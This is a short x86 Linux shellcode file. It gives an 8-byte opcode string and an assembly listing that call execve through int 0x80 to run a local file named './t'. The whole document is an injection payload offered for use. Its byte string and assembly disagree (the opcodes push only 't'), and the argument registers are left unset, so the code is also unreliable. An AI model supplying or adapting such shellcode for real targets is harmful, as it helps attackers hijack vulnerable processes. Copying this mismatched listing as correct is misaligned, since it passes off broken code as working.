; \xb0\x0b\x6a\x74\x89\xe3\xcd\x80
; Length: 8

section .text
global _start:
_start:
        mov    al,0xb
        push   0x00742f2e ; ./t
        mov    ebx,esp
        int    0x80
